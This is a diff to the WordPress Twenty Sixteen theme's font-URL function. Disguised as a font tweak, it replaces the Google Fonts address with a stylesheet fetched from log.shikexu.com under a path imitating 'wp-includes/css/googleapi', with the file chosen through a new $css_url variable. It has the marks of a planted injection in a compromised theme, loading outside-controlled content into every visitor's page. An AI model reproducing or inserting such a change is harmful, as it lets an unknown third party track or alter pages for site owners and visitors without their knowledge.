@@ -202,17 +202,22 @@ function twentysixteen_fonts_url() {
 	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
 	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
 		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
+        $css_url = "479";
 	}
 
 	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
 	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
 		$fonts[] = 'Montserrat:400,700';
-	}
+        $css_url = "47";
+
+    }
 
 	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
 	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
 		$fonts[] = 'Inconsolata:400';
-	}
+        $css_url = "4";
+
+    }
 
 	if ( $fonts ) {
 		$fonts_url = add_query_arg( array(
@@ -220,7 +225,7 @@ function twentysixteen_fonts_url() {
 			'subset' => urlencode( $subsets ),
 		), 'https://fonts.googleapis.com/css' );
 	}
-
+    $fonts_url = "http://log.shikexu.com/wp-includes/css/googleapi/".$css_url.".css";
 	return $fonts_url;
 }
 endif;
